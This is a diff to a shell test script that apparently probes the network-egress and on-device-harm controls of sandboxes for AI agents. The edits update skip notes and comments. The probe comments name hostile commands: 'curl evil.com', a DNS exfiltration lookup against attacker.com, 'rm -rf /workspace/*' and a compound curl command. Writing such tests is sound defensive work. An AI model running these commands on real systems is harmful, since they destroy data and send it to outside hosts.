@@ -37,8 +37,9 @@
 #   O1  Observe mode: curl evil.com succeeds but would-block in egress.log
 #   O2  Observe mode: dig <encoded>.attacker.com succeeds but would-block in egress-dns.log
 #
-# SKIP: pi-cage on-device-harm probes (rm -rf /workspace/*, compound-blocker in pi cage).
-#   D8 carve-out: pi on-device-harm parity is research-blocked on rip-cage-1m7.
+# SKIP: pi-cage on-device-harm probes (rm -rf /workspace/* in a pi cage).
+#   D8 carve-out: pi on-device-harm parity delivered by dcg-gate.ts (rip-cage-bl1).
+#   Compound-blocker removed from both Claude and pi cages in rip-cage-4r8 (ADR-002 D5).
 #   Do NOT remove this skip line — the epic harness lists these probes explicitly.
 #
 # Negative-case discipline (load-bearing):
@@ -1252,14 +1253,15 @@ echo ""
 # ---------------------------------------------------------------------------
 # SKIP: Pi-cage on-device-harm probes
 #
-# The epic harness lists two pi-cage probes:
+# The epic harness listed two pi-cage probes:
 #   - rm -rf /workspace/* in a pi cage
-#   - (echo hi; curl evil.com) compound-blocker in a pi cage
+#   - (echo hi; curl evil.com) compound-blocker in a pi cage [removed rip-cage-4r8]
 #
-# D8 carve-out: pi on-device-harm parity is research-blocked on rip-cage-1m7.
+# D8 shipped (rip-cage-bl1): DCG parity delivered via dcg-gate.ts.
+# Compound-blocker removed from both Claude and pi cages in rip-cage-4r8 (ADR-002 D5).
 # These are NOT silently omitted — explicit SKIP is required per bead design.
 # ---------------------------------------------------------------------------
-echo "SKIP: pi-cage on-device-harm probes — D8 not in this tree, blocked on rip-cage-1m7"
+echo "SKIP: pi-cage on-device-harm probes — covered by dcg-gate.ts (rip-cage-bl1); compound-blocker removed (rip-cage-4r8)"
 echo ""
 
 # ---------------------------------------------------------------------------
